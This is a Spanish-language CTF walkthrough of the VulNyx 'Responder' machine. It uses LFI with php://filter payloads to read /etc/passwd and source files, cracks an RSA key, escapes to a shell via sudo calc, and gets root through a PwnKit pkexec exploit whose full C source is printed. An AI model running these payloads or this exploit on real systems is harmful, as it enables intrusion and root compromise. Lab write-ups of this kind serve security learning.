---
layout      : post
title       : "Responder - Vulnyx"
author      : elc4br4
image       : /assets/images/VULNYX/Responder-Vulnyx/Responder.jpg
optimized_image : /assets/images/VULNYX/Responder-Vulnyx/Responder.jpg
category    : [ Vulnyx ]
tags        : [ Linux ]
description : 
---

Máquina medium de la plataforma VulNyx.

Como en todo CTF comenzamos realizando un reconocimiento de puertos abiertos con nmap.

```bash
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

Tenemos el puerto 22 filtered y el puerto 80 abierto con un servidor web Apache/2.4.38.

Abro el navegador para acceder a la dirección ip y ver que tenemos...

![](/assets/images/VULNYX/Responder-Vulnyx/web.webp)

> your answer is in the answer...

Miro el código fuente y no veo nada relevante por lo que procedo a fuzzear para descubrir rutas o archivos en el servidor web.

En esta ocasión usaré la herramienta feroxbuster para cambiar un poco...

![](/assets/images/VULNYX/Responder-Vulnyx/fuzz1.webp)

Tras fuzzear encuentro el archivo `filemanager.php` pero al abrirlo te redirige al index.html... por lo que decido abrir Burpsuite para capturar la petición.

```bash
GET /filemanager.php HTTP/1.1
Host: 192.168.0.18
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
Al tener un archivo php lo primero que se me ocurre es probar para ver si es vulnerable a `Local File Inclusion`.

Para ello he de fuzzear de nuevo para obtener el parámetro que he de incluir en la url para poder efectuar el LFI en caso de que lo haya.

Para ello usaré wfuzz.

```bash
❯ wfuzz -c --hc=404 --hw=0 -u 'http://192.168.0.18/filemanager.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirb/common.txt 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000003267:   302        27 L     39 W       1430 Ch     "random"                                                                                                                   
```

Tras encontrar el parámetro intento leer archivos de la máquina vícitma, como el archivo passwd.

```bash
GET /filemanager.php?random=/etc/passwd HTTP/1.1
Host: 192.168.0.18
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

![](/assets/images/VULNYX/Responder-Vulnyx/passwd.webp)

Y podemos leer el archivo y ver que existen dos usuarios que me interesan.

> elliot y rohit

Intenté leer el rsa de los usuarios pero no tuve suerte... por lo que me acordé de que al acceder a la ruta filemanager.php se me redirigía al index.html, por lo que intento leer el archivo filemanager.php

Pero al intentar leerlo se me arroja el error 500 Internal Server Error...

Existen otras formas de leer archivos a través de un LFI, por lo que buscando encontré los PHP wrappers y vi que se pueden ofuscar archivos en base64 para posteriormente desofuscarlos en mi máquina y acceder al contenido de los mismos.

En otras palabras, el Wrapper filter nos permite encodear el archivo que le especifiquemos, que nos permite poder leer archivos PHP que en otro caso, el navegador simplemente interpretaría directamente.

> php://filter

SI al filter le decimos que queremos encodear en base64 el archivo, podremos leer el contenido del mismo.

`php://filter/convert.base64-encode/resource=<archivo>`

Esto lo conseguimos de la siguiente forma:

```bash
GET /filemanager.php?random=php://filter/convert.base64-encode/resource=filemanager.php HTTP/1.1
Host: 192.168.0.18
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

Por lo que con curl hago una petición GET al archivo y directamente lo decodifico de base64 a texto plano.

```bash
curl -X GET "http://192.168.0.18/filemanager.php?random=php://filter/convert.base64-encode/resource=/var/www/html/filemanager.php" | base64 -d > filemanager.txt
```

Y tras leer el archivo encuentro una clave privada RSA.

![](/assets/images/VULNYX/Responder-Vulnyx/rsa-privada.webp)

Pero para poder usar esta clave necesitamos averiguar primero la contraseña.. esto lo haré con la herramienta RSAcrack creada por d4t4s3c.

[RSAcrack](https://github.com/d4t4s3c/RSAcrack)

Haciendo uso del diccionario rockyou.txt consigo obtener la contraseña de la clave privada.

![](/assets/images/VULNYX/Responder-Vulnyx/RSAcrack.webp)

Ahora ya podrías hacer uso de la clave RSA pero recordemos que el puerto 22 está filtered...

Pero hemos comprobado que está filtered por ipv4, pero no por ipv6... por lo que podríamos intentar obtener la dirección ipv6.

Esto lo hacemos leyendo el archivo `if_inet6` ubicado en la ruta `/proc/net/`.

```bash
❯ curl -X GET "http://192.168.0.18/filemanager.php?random=php://filter/convert.base64-encode/resource=/proc/net/if_inet6" 2>/dev/null | base64 -d

00000000000000000000000000000001 01 80 10 80       lo
fe800000000000000a0027fffe02f910 02 40 20 80   enp0s3
```
Y como vemos ya tenemos ahí la dirección ipv6, solo hay que separarla correctamente.

> fe80:0000:0000:0000:0a00:27ff:fe02:f910

Una vez separada procedo a conectarme vía SSH usando la clave rsa.

```bash
ssh elliot@fe80::a00:27ff:fe02:f910%enp0s17 -i id_rsa
```

![](/assets/images/VULNYX/Responder-Vulnyx/elliot.webp)

Y porfin he ganado acceso a la máquina, por lo que el siguiente paso es migrarme al usuario rohit.

Lanzo el comando `sudo -l` para enumerar permisos sudo.

```bash
elliot@responder:~$ sudo -l
sudo: unable to resolve host responder: Nombre o servicio desconocido
Matching Defaults entries for elliot on responder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elliot may run the following commands on responder:
    (rohit) NOPASSWD: /usr/bin/calc
elliot@responder:~$ 
```

Puedo ejecutar como el usuario rohit el binario calc.

```bash
elliot@responder:~$ sudo -u rohit /usr/bin/calc --help
```

Una vez lo hemos ejecutado solo debemos introducir `!bash`.

Y ya nos habremos convertido en el usuario rohit.

Y por último nos toca convertirnos en root.

# Escalada de Privilegios

Para ello busco archivos con permisos 4000 usando el comando find.

```bash
rohit@responder:/home/elliot$ find / -perm -4000 -type f 2>/dev/null | xargs ls -la
-rwsr-xr-x 1 root root        54096 jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root        44528 jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root        84016 jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        51280 ene 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root        44440 jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root        63736 jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root        23288 ene 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root        63568 ene 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root       157192 ene 20  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root        34888 ene 10  2019 /usr/bin/umount
-rwsr-xr-- 1 root messagebus  51184 jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10232 mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       436552 ene 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        18888 ene 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
```

Y veo que tenemos el binario pkexec... por lo que primero intento averiguar la versión del binario.

```bash
rohit@responder:/home/elliot$ /usr/bin/pkexec --version
pkexec version 0.105
```

Y busco la forma de escalar privilegios con pkexec versión 0.105

Antes nada compruebo que pkexec es vulnerable... lanzo un script en python llamado Pwnkit Hunter

[Pwnkit Hunter](https://github.com/cyberark/PwnKit-Hunter)

![](/assets/images/VULNYX/Responder-Vulnyx/pwnkit-hunter.webp)

Como vemos es vulnerable, por lo que buscando encuentro un exploit que me puede servir.

[Pkexec 0.105](https://packetstormsecurity.com/files/165739/PolicyKit-1-0.105-31-Privilege-Escalation.html)

Para ello sigo estos pasos:

1. Crear archivo evil-so.c y exploit.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}
```


```c
#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}
```

2. Una vez creados los compilamos

```bash
gcc -shared -o evil.so -fPIC evil-so.c
```

```bash
 gcc exploit.c -o exploit
```

3. Por último lanzamos el exploit

```bash
rohit@responder:/tmp$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

Y porfin somos root y podemos leer la flag root.txt


